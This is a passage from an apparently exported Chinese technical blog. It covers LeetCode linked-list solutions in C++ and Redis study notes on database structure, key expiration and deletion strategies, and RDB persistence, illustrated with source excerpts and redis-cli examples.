<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *front = head;</span><br><span class="line">    ListNode *behind = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">    	front = front-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(front != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        front = front-&gt;next;</span><br><span class="line">        behind = behind-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> behind;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历原链表，依次对每个节点用头插法创建新链表并返回。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度O(N)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *l = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(head) &#123;</span><br><span class="line">        <span class="comment">// 依次对每个节点用头插法创建新链表</span></span><br><span class="line">        ListNode *s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;val, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            l = s;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s-&gt;next = l;</span><br><span class="line">            l = s;</span><br><span class="line">        &#125;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 迭代法，遍历单链表，依次改变每个节点的next指向即可。注意next指向改变后，就无法访问下一个节点了，所以要在改next指针之前，用一个临时指针保存next指向的节点。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *pre = <span class="literal">NULL</span>;</span><br><span class="line">    ListNode *cur = head;</span><br><span class="line">    <span class="keyword">for</span>( ; cur != <span class="literal">NULL</span> ; ) &#123;</span><br><span class="line">        ListNode *tmpNext = cur-&gt;next; <span class="comment">// 用临时指针暂存next指向的节点</span></span><br><span class="line">        cur-&gt;next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = tmpNext;	<span class="comment">// 当前节点next值改变后，从临时指针恢复下一个需遍历的节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(七)——数据库</title>
    <url>/2021/03/13/2021-03-13-redis-note-07-database/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>介绍Redis数据库的实现，解答以下几个问题：</p>
<ul>
<li>Redis服务器是怎么保存数据库的？客户端又是怎么切换数据库的？</li>
<li>数据库的增、删、改、查的实现</li>
<li>键的过期时间是怎么保存的，又是如何删除的？怎么判断一个键是否过期？</li>
<li>过期键的删除策略有哪些？每种策略的优缺点分析？Redis采用的是哪种策略，具体又是怎么实现的？</li>
</ul>
<span id="more"></span>

<h3 id="服务器中的数据库"><a href="#服务器中的数据库" class="headerlink" title="服务器中的数据库"></a>服务器中的数据库</h3><p>Redis将所有数据库都保存在服务器状态 <code>server.h/redisServer</code>结构的db数组中，db数组中的每一项表示一个数据库, dbnum表示数据库个数。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	redisDb *db;	<span class="comment">// db数组保存所有数据库</span></span><br><span class="line">    <span class="type">int</span> dbnum;		<span class="comment">// 表示数据库个数</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>服务器初始化时，默认创建16个数据库。可以通过修改配置文件的databases选项更改数据库的数量。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># modify /etc/redis/redis.conf</span><br><span class="line">databases 16</span><br></pre></td></tr></table></figure>

<p>客户端可通过<code>config get databases</code>命令查看数据库的数量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get databases</span><br><span class="line">1) &quot;databases&quot;</span><br><span class="line">2) &quot;16&quot;</span><br></pre></td></tr></table></figure>

<h3 id="客户端切换数据库"><a href="#客户端切换数据库" class="headerlink" title="客户端切换数据库"></a>客户端切换数据库</h3><p>每个客户端都有自己的目标数据库，默认情况下客户端的目标数据库为0号数据库。客户端可以通过执行<code>SELECT [dbid]</code> 命令切换目标数据库。</p>
<p>Redis服务器中，使用redisClient结构(6.0版本此结构体名称改为client)表示客户端属性，结构中的db属性表示客户端的目标数据库，如下：;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisClient</span> &#123;</span></span><br><span class="line">	redisDb *db;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125; redisClient;</span><br></pre></td></tr></table></figure>

<p>通过修改db指针，指向redisServer.db数组中的某个元素，来实现目标数据库的切换，源码参考<code>db.c/selectDb</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">selectDb</span><span class="params">(redisClient *c, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (id &lt; <span class="number">0</span> || id &gt;= server.dbnum)</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    c-&gt;db = &amp;server.db[id];	<span class="comment">// 通过修改db指针，指向redisServer.db数组中的某个元素，实现目标数据库的切换</span></span><br><span class="line">    <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数据库键空间、增删改查操作"><a href="#数据库键空间、增删改查操作" class="headerlink" title="数据库键空间、增删改查操作"></a>数据库键空间、增删改查操作</h3><p>Redis是一个Key-Value型数据库，服务器中的每个数据库都由一个redisDb结构表示，其中redisDb结构的dict字典保存了数据库中的所有键值对，将这个字典称为<strong>键空间</strong>(key space)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisDb</span> &#123;</span></span><br><span class="line">	dict *dict;		<span class="comment">// 数据库键空间，保存数据库中所有键值对</span></span><br><span class="line">	dict *expires;	<span class="comment">// 过期字典</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以下介绍Redis数据库增、删、改、查操作的实现：</p>
<h4 id="查询键的实现"><a href="#查询键的实现" class="headerlink" title="查询键的实现"></a>查询键的实现</h4><p>在键空间中查询给定键是否存在， 通过lookupKey函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">lookupKey</span><span class="params">(redisDb *db, robj *key)</span> &#123;</span><br><span class="line">    dictEntry *de = dictFind(db-&gt;dict,key-&gt;ptr);</span><br><span class="line">    <span class="keyword">if</span> (de) &#123;        </span><br><span class="line">        robj *val = dictGetVal(de);  <span class="comment">// 如果键存在，就取出值</span></span><br><span class="line">        <span class="comment">// 更新时间信息（只在不存在子进程时执行，充分利用写时复制机制）</span></span><br><span class="line">        <span class="keyword">if</span> (server.rdb_child_pid == <span class="number">-1</span> &amp;&amp; server.aof_child_pid == <span class="number">-1</span>)</span><br><span class="line">            val-&gt;lru = LRU_CLOCK();</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="增加键的实现"><a href="#增加键的实现" class="headerlink" title="增加键的实现"></a>增加键的实现</h4><p> 将新键值对添加到键空间，通过dbAdd函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dbAdd</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    sds copy = sdsdup(key-&gt;ptr);</span><br><span class="line">    <span class="type">int</span> retval = dictAdd(db-&gt;dict, copy, val);	<span class="comment">// 增加键值对</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除键的实现"><a href="#删除键的实现" class="headerlink" title="删除键的实现"></a>删除键的实现</h4><p>删除给定的键，注意需同时删除这个键的过期时间， 通过dbDelete函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dbDelete</span><span class="params">(redisDb *db, robj *key)</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (dictSize(db-&gt;expires) &gt; <span class="number">0</span>) dictDelete(db-&gt;expires,key-&gt;ptr); <span class="comment">// 先删除键的过期时间</span></span><br><span class="line">    <span class="keyword">if</span> (dictDelete(db-&gt;dict,key-&gt;ptr) == DICT_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 删除成功返回1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 删除失败返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="更新键的实现"><a href="#更新键的实现" class="headerlink" title="更新键的实现"></a>更新键的实现</h4><p>通过dbOverwrite函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setKey</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (lookupKeyWrite(db,key) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 如果key不存在，新增键值对</span></span><br><span class="line">        dbAdd(db,key,val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 如果key已经存在，更新键值对</span></span><br><span class="line">        dbOverwrite(db,key,val);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dbOverwrite</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    dictEntry *de = dictFind(db-&gt;dict,key-&gt;ptr);</span><br><span class="line">	redisAssertWithInfo(<span class="literal">NULL</span>,key,de != <span class="literal">NULL</span>);</span><br><span class="line">	dictReplace(db-&gt;dict, key-&gt;ptr, val);	<span class="comment">// 更新键空间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="其他对键空间的操作"><a href="#其他对键空间的操作" class="headerlink" title="其他对键空间的操作"></a>其他对键空间的操作</h4><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">FLUSHALL</td>
<td align="left">清空所有数据库</td>
</tr>
<tr>
<td align="left">FLUSHDB</td>
<td align="left">清空目标数据库</td>
</tr>
<tr>
<td align="left">RANDOMKEY</td>
<td align="left">随机返回一个键</td>
</tr>
<tr>
<td align="left">DBSIZE</td>
<td align="left">返回目标数据库的键值对数量</td>
</tr>
<tr>
<td align="left">EXISTS [key]</td>
<td align="left">判断键是否存在</td>
</tr>
</tbody></table>
<h3 id="键的生存时间"><a href="#键的生存时间" class="headerlink" title="键的生存时间"></a>键的生存时间</h3><h4 id="如何设置键的生存时间？"><a href="#如何设置键的生存时间？" class="headerlink" title="如何设置键的生存时间？"></a>如何设置键的生存时间？</h4><p><strong>expire, pexpire</strong>命令以秒&#x2F;毫秒为精度，对数据库的某个键设置生存时间(Time to Live：TTL)。经过指定的时间后，服务器会自动删除生存时间为0的键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; expire key 5	# 设置生存时间为5秒，5秒后服务器自动删除这个键</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key			# TTL命令返回这个键的生存时间，单位:秒</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; get key			# 5秒后，键过期，被服务器自动删除</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<p>Redis中，可以使用<strong>expire, pexpire, expireat, pexpireat</strong>设置键的生存时间，用法如下：</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">expire [key] [ttl]</td>
<td align="left">设置键的生存时间为ttl秒</td>
</tr>
<tr>
<td align="left">pexpire [key] [ttl]</td>
<td align="left">设置键的生存时间为ttl毫秒</td>
</tr>
<tr>
<td align="left">expireat [key] [timestamp]</td>
<td align="left">设置过期时间为秒级时间戳</td>
</tr>
<tr>
<td align="left">pexpireat [key] [timestamp]</td>
<td align="left">设置过期时间为毫秒级时间戳</td>
</tr>
</tbody></table>
<p>Redis源码实现中，expire, pexpire, expireat命令最终都会转化为pexpireat命令，相关源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">expireCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// expire 命令</span></span><br><span class="line">    expireGenericCommand(c,mstime(),UNIT_SECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">expireatCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// expireat 命令</span></span><br><span class="line">    expireGenericCommand(c,<span class="number">0</span>,UNIT_SECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pexpireCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// pexpire 命令</span></span><br><span class="line">    expireGenericCommand(c,mstime(),UNIT_MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pexpireatCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// pexpireat 命令</span></span><br><span class="line">    expireGenericCommand(c,<span class="number">0</span>,UNIT_MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">expireGenericCommand</span><span class="params">(redisClient *c, <span class="type">long</span> <span class="type">long</span> basetime, <span class="type">int</span> unit)</span>;</span><br></pre></td></tr></table></figure>

<h4 id="TIME命令介绍"><a href="#TIME命令介绍" class="headerlink" title="TIME命令介绍"></a>TIME命令介绍</h4><p>time命令用于返回当前服务器时间，返回值包含两个字符串，意义如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; TIME</span><br><span class="line">1) &quot;1615638731&quot;			# 表示当前时间，格式为UNIX时间戳</span><br><span class="line">2) &quot;628667&quot;				# 表示当前这一秒中，已经流逝的微秒数，1秒=1000000微妙，这个值总小于1000000</span><br></pre></td></tr></table></figure>

<h4 id="redis如何保存过期时间？"><a href="#redis如何保存过期时间？" class="headerlink" title="redis如何保存过期时间？"></a>redis如何保存过期时间？</h4><p>redisDb结构的expires字典保存了数据库中所有键的过期时间，这个expire字典我们称之为<strong>过期字典</strong>。</p>
<ul>
<li>过期字典的键是一个指针，指向键空间的某个键对象</li>
<li>过期字典的值是一个long long类型整数，毫秒精度的UNIX时间戳。</li>
</ul>
<p>pexpireat命令在过期字典中查找给定键，并设置值为过期时间(格式为UNIX时间戳)；具体实现可参考expireGenericCommand函数。</p>
<h4 id="redis如何移除过期时间？"><a href="#redis如何移除过期时间？" class="headerlink" title="redis如何移除过期时间？"></a>redis如何移除过期时间？</h4><p>persist命令可以移除一个键的过期时间， 效果相当于反向执行pexpireat命令：在过期字典中查找给定键，删除这个键对应的值；具体实现可参考persistCommand函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; EXPIRE key 100		# 设置key的生存时间100秒</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key				# 返回生存时间</span><br><span class="line">(integer) 97</span><br><span class="line">127.0.0.1:6379&gt; PERSIST key			# 移除key的生存时间</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key				# 生存时间为-1, 表示为永久键</span><br><span class="line">(integer) -1</span><br></pre></td></tr></table></figure>

<h4 id="怎么判断一个key是否过期"><a href="#怎么判断一个key是否过期" class="headerlink" title="怎么判断一个key是否过期"></a>怎么判断一个key是否过期</h4><p>TTL命令以秒为单位返回键的生存时间，PTTL命令以毫秒为单位返回键的生存时间。</p>
<p>TTL、PTTL命令<strong>通过计算键的过期时间和当前时间的差</strong>来实现。</p>
<p>判断一个key是否过期的步骤如下，具体实现可以参考expireIfNeeded函数：</p>
<ul>
<li>首先，检查给定键是否在过期字典中，如果存在，取得键的过期时间</li>
<li>其次，检查当前UNIX时间戳是否大于键的过期时间，如果大于表示已过期。</li>
</ul>
<h3 id="过期键删除策略"><a href="#过期键删除策略" class="headerlink" title="过期键删除策略"></a>过期键删除策略</h3><p>有三种常见的过期键删除策略，分别如下：</p>
<ul>
<li>定时删除：设置键过期时间的同时创建一个定时器，定时器超时后立即删除该键。</li>
<li>惰性删除：放任键过期不管，直到需要读写改键时才检查是否过期，如过期就删除该键。</li>
<li>定期删除：每隔一段时间，对数据库做一次检查，删除过期的键。</li>
</ul>
<p>三种策略的优缺点分析：</p>
<ul>
<li><p>定时删除：对内存友好，对CPU不友好，影响服务器的响应时间和吞吐量。</p>
</li>
<li><p>惰性删除：对CPU友好，但浪费内存，可能导致内存泄漏。</p>
</li>
<li><p>定期删除：是对前两种策略的折中，其难点在于确定删除操作执行时长和频率。</p>
</li>
</ul>
<h4 id="Redis使用的过期键删除策略"><a href="#Redis使用的过期键删除策略" class="headerlink" title="Redis使用的过期键删除策略"></a>Redis使用的过期键删除策略</h4><p>Redis综合使用了惰性删除和定期删除这两种策略，策略具体实现如下：</p>
<h4 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a>惰性删除</h4><p>Redis的惰性删除策略在expireIfNeed函数实现，所有读写数据库的命令在执行之前都会调用expireIfNeeded函数对输入键进行检查：</p>
<ul>
<li>如果输入键已经过期，expireIfNeeded函数将输入键删除，命令当做键不存在的情况去执行。</li>
<li>如果输入键未过期，expireIfNeed函数什么也不做，继续执行实际的命令流程。</li>
</ul>
<h4 id="定期删除"><a href="#定期删除" class="headerlink" title="定期删除"></a>定期删除</h4><p>过期键的定期删除策略由redis.c&#x2F;activeExpireCycle函数实现。每当Redis的时间事件serverCron函数周期性执行时，activeExpireCycle函数就随之被调用。 这个周期默认为0.1秒，可以通过配置文件的hz选项修改这个值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># modify /etc/redis/redis.conf</span><br><span class="line"># The range is between 1 and 500, however a value over 100 is usually not</span><br><span class="line"># a good idea. Most users should use the default of 10 and raise this up to</span><br><span class="line"># 100 only in environments where very low latency is required.</span><br><span class="line">hz 10</span><br></pre></td></tr></table></figure>

<p>activeExpireCycle函数的实现原理：在规定时间内，分多次遍历服务器中的数据库，从数据库的expires字典中随机检查一部分键的过期时间，并删除其中的过期键。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>《Redis设计与实现》第9章 数据库</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(八)——RDB持久化</title>
    <url>/2021/03/14/2021-03-14-redis-note-08-rdb/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Redis是基于内存的数据库，服务器进程退出后，内存中的数据会丢失。为了解决这个问题，Redis提供了RDB持久化机制，将内存中的数据保存到硬盘，从而避免数据意外丢失。</p>
<h2 id="RDB持久化"><a href="#RDB持久化" class="headerlink" title="RDB持久化"></a>RDB持久化</h2><p>RDB持久化将某个时间点上的数据库状态保存到一个RDB文件，这个RDB文件是一个经过压缩的二进制文件，Redis服务器可以通过读取RDB文件还原数据库状态。</p>
<span id="more"></span>

<p>RDB文件的生成路径和文件名通过配置文件指定，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dbfilename指定RDB文件名</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"># dir表示工作目录, RDB文件会写入这个目录</span><br><span class="line">dir /var/redis/6379</span><br></pre></td></tr></table></figure>

<h3 id="1-RDB文件如何创建"><a href="#1-RDB文件如何创建" class="headerlink" title="1. RDB文件如何创建"></a>1. RDB文件如何创建</h3><p>RDB持久化既可以手动触发，也可以通过配置文件的选项定期触发。</p>
<h4 id="1-1-save-bgsave命令"><a href="#1-1-save-bgsave命令" class="headerlink" title="1.1 save, bgsave命令"></a>1.1 save, bgsave命令</h4><p>执行<code>save</code>, <code>bgsave</code>命令，可以手动生成RDB文件。两者的区别如下：</p>
<ul>
<li><code>save</code>命令会阻塞Redis服务器进程，直到RDB文件创建完毕；阻塞期间服务器无法处理任何请求。</li>
<li><code>bgsave</code>命令会fork一个子进程，由子进程负责创建RDB文件，父进程能够继续处理命令请求。</li>
</ul>
<p><strong>注：</strong><code>bgsave</code>命令执行期间，服务器会拒绝执行客户端的<code>save</code>, <code>bgsave</code>命令，原因是防止竞争条件。</p>
<p>创建RDB文件的实际动作通过<code>rdb.c/rdbSave</code>函数完成,3.0版本的实现细节如下:</p>
<ul>
<li><p>先创建临时文件<code>&quot;temp-%d.rdb&quot;</code>, 其中%d为当前进程id。</p>
</li>
<li><p>遍历所有数据库,将数据库状态写入到该临时文件, 写入完成后调用<code>fflush</code>, <code>fsync</code>确保数据被写入硬盘。</p>
</li>
<li><p>调用<code>rename</code>方法,原子性地覆盖旧的RDB文件，覆盖成功后，将<code>dirty</code>计数器清零并记录当前时间(即最后一次完成RDB持久化的时间)。</p>
</li>
</ul>
<h4 id="1-2-定期触发"><a href="#1-2-定期触发" class="headerlink" title="1.2 定期触发"></a>1.2 定期触发</h4><h5 id="1-2-1-保存条件怎么设置"><a href="#1-2-1-保存条件怎么设置" class="headerlink" title="1.2.1 保存条件怎么设置"></a>1.2.1 保存条件怎么设置</h5><p>在配置文件中更改<code>save &lt;seconds&gt; &lt;changes&gt;</code>选项，可以设置多个<strong>保存条件</strong>。只要其中某个保存条件被满足，服务器就执行<code>bgsave</code>命令。</p>
<p>官方给出的save选项的典型设置和意义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Save the DB on disk:</span><br><span class="line">#   save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line">#</span><br><span class="line">#   Will save the DB if both the given number of seconds and the given</span><br><span class="line">#   number of write operations against the DB occurred.</span><br><span class="line">#</span><br><span class="line">#   In the example below the behavior will be to save:</span><br><span class="line">#   after 900 sec (15 min) if at least 1 key changed</span><br><span class="line">#   after 300 sec (5 min) if at least 10 keys changed</span><br><span class="line">#   after 60 sec if at least 10000 keys changed</span><br><span class="line">#</span><br><span class="line">#   Note: you can disable saving completely by commenting out all &quot;save&quot; lines.</span><br><span class="line">#</span><br><span class="line">#   It is also possible to remove all the previously configured save</span><br><span class="line">#   points by adding a save directive with a single empty string argument</span><br><span class="line">#   like in the following example:</span><br><span class="line">#</span><br><span class="line">#   save &quot;&quot;</span><br><span class="line"></span><br><span class="line">save 900 1				# 如果900秒内至少1个键被修改，就执行bgsave命令</span><br><span class="line">save 300 10				# 300秒内至少10个键被修改，就执行bgsave命令</span><br><span class="line">save 60 10000			# 60秒内至少10000个键被修改，就执行bgsave命令</span><br></pre></td></tr></table></figure>

<p>可以看出，如果想关闭RDB功能，只需注释掉所有save选项后，再添加<code>save &quot;&quot;</code>即可</p>
<h5 id="1-2-2-实现细节"><a href="#1-2-2-实现细节" class="headerlink" title="1.2.2 实现细节"></a>1.2.2 实现细节</h5><p>Redis服务器状态通过redisServer结构表示，其中<code>saveparams</code>属性用于记录所有的保存条件，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> *<span class="title">saveparams</span>;</span> <span class="comment">// 一维数组, = &#123;&#123;900, 1&#125;, &#123;300, 10&#125;, &#123;60, 10000&#125;&#125;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> &#123;</span></span><br><span class="line">	<span class="type">time_t</span> seconds;	<span class="comment">// 秒数</span></span><br><span class="line">	<span class="type">int</span> changes;	<span class="comment">// 修改数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>光有保存条件还不行，我们还需要知道<strong>上一次成功执行RDB持久化的时间</strong>，以及<strong>距离上一次成功执行RDB持久化，服务器对数据库总共做了多少次修改</strong>，这样才能和每个保存条件做比较，最终判断某个保存条件是否被满足。</p>
<p>因此，redisServer结构中新增<code>dirty</code>计数器和<code>lastsave</code>属性，如下：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> redisServer &#123;</span><br><span class="line">	<span class="built_in">long</span> <span class="built_in">long</span> dirty;	<span class="comment">// 计数器</span></span><br><span class="line">	time_t lastsave;	<span class="comment">// 上一次成功执行持久化的时间，格式是UNIX时间戳</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dirty</code>计数器记录距离上一次成功执行RDB持久化，服务器对数据库一共做了多少次修改。</li>
<li><code>lastsave</code>属性记录上一次成功执行RDB持久化的时间，格式为UNIX时间戳。</li>
</ul>
<p>Redis服务器会周期性地检查保存条件是否满足, 源码实现可参考<code>redis.c/ServerCron</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// serverCron是Redis服务器的时间事件，周期性执行，默认周期为0.1s, 可以通过改配置选项hz修改这个默认周期</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">serverCron</span><span class="params">(<span class="keyword">struct</span> aeEventLoop *eventLoop, <span class="type">long</span> <span class="type">long</span> id, <span class="type">void</span> *clientData)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.saveparamslen; j++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> *<span class="title">sp</span> =</span> server.saveparams+j;</span><br><span class="line">        <span class="keyword">if</span> (server.dirty &gt;= sp-&gt;changes &amp;&amp;</span><br><span class="line">            server.unixtime-server.lastsave &gt; sp-&gt;seconds &amp;&amp;</span><br><span class="line">            (server.unixtime-server.lastbgsave_try &gt;</span><br><span class="line">            REDIS_BGSAVE_RETRY_DELAY ||</span><br><span class="line">            server.lastbgsave_status == REDIS_OK)) &#123;</span><br><span class="line">            rdbSaveBackground(server.rdb_filename); <span class="comment">// 某个保存条件满足，就执行BGSAVE命令</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-RDB文件如何加载"><a href="#2-RDB文件如何加载" class="headerlink" title="2. RDB文件如何加载"></a>2. RDB文件如何加载</h3><p>Redis没有提供专门加载RDB文件的命令，只要Redis在启动时检测到了RDB文件的存在，就会自动加载RDB文件，加载RDB文件的动作由<code>rdb.c/rdbLoad</code>函数完成。</p>
<p><strong>注</strong>: 如果Redis开启了AOF持久化功能, 服务器会优先使用AOF文件而不是RDB文件还原数据库。</p>
<h3 id="3-RDB文件结构和解析方法"><a href="#3-RDB文件结构和解析方法" class="headerlink" title="3. RDB文件结构和解析方法"></a>3. RDB文件结构和解析方法</h3><p>能借助工具离线分析RDB文件即可, 掌握RDB文件结构是非必要的，只需了解：</p>
<ul>
<li>RDB文件是一个经过压缩的二进制文件，对于不同类型的键，会使用不同的方式去存储。</li>
<li>RDB文件不保存已过期的键，但是会保存键的过期时间。</li>
</ul>
<p>Redis官方提供了<code>redis-check-rdb</code>工具用于检测RDB文件。</p>
<p>举例，在某个空的redis数据库中新增5个key，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 每种类型键增加1个						    # 查询键的命令</span><br><span class="line">set key1 123								# get key1</span><br><span class="line">rpush list1 1 2 3							# lrange 0 -1</span><br><span class="line">hset hashtable1 k1 v1 k2 v2 k3 v3 			# hgetall hashtable1</span><br><span class="line">sadd set1 1 2 3								# smembers set1</span><br><span class="line">zadd zset1 1.0 m1 2.0 m2 3.0 m3				# zrange zset1 0 -1 withscores</span><br></pre></td></tr></table></figure>

